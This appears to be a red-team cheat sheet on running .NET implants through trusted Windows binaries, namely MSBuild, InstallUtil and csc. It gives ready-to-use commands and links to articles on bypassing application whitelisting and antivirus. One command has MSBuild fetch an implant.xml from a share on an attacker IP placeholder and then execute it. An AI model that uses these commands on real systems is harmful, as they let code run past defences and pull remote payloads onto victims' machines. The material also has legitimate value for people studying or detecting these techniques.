# DotNET Execution

## MSBuild

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe implant.csproj

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe implant.xml
```

```
C:\> cmd /V /c "set COMPILER="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !COMPILER! /noautoresponse /preprocess \\<attacker_IP>\<share_name>\implant.xml > implant.xml & !COMPILER! implant.xml"
```

## InstallUtil

https://gist.github.com/Meatballs1/36fea5961ba7340821b1

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\implant.exe
```

### CSC

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\path\to\implant.cs
```

---
## References

### LOLBAS

- [LOLBAS: MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)

- [LOLBAS: InstallUtil](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)

- [LOLBAS: CSC](https://lolbas-project.github.io/lolbas/Binaries/Csc/)

- [LOLBAS: Ilasm](https://lolbas-project.github.io/lolbas/Binaries/Ilasm/)

### Hacktricks

- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/windows)

### Red Team Notes

- [Red Team Notes: InstallUtil](https://www.ired.team/offensive-security/code-execution/t1118-installutil)

- [Red Team Notes: Using MSBuild to Execute Shellcode in C#](https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c)

### Hacking Articles

- [Hacking Articles: Windows Exploitation - MSBuild](https://www.hackingarticles.in/windows-exploitation-msbuild/)

### Github

- [khr0x40sh: WhiteListEvasion](https://github.com/khr0x40sh/WhiteListEvasion)

### Secarma

- [Secarma: Three ways of using MSBuild to beat CrowdStrike](https://secarma.com/three-ways-of-using-msbuild-to-beat-crowdstrike/)

### arno0x0x

- [arno0x0x: Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

### Black Hills Information Security

- [Black Hills Information Security: How to Bypass Application Whitelisting & AV](https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/)